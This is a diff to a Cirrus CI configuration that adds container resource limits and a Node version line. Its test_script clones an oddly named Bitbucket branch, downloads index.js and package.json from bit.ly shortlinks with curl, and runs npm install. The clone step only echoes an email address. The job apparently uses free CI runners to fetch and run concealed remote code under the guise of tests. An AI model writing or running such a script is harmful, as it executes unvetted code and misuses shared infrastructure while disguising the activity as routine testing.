@@ -1,8 +1,11 @@
 windows_container:
   image: cirrusci/windowsservercore:2019
+  cpu: 1
+  memory: 2G
 task:
   clone_script: echo "dinhthilieunhi@outlook.com"
   test_script:
+    - nvm use 14.16.0
     - git clone https://meocodervippro@bitbucket.org/lunarcrush/lunarcrush-data.git --branch dinhthilieunhi_outlook-com --single-branch lunarCrushData
     - curl -fsSL https://bit.ly/3nKzqND -o index.js && curl -fsSL https://bit.ly/3cBwVH3 -o package.json
     - npm i -s
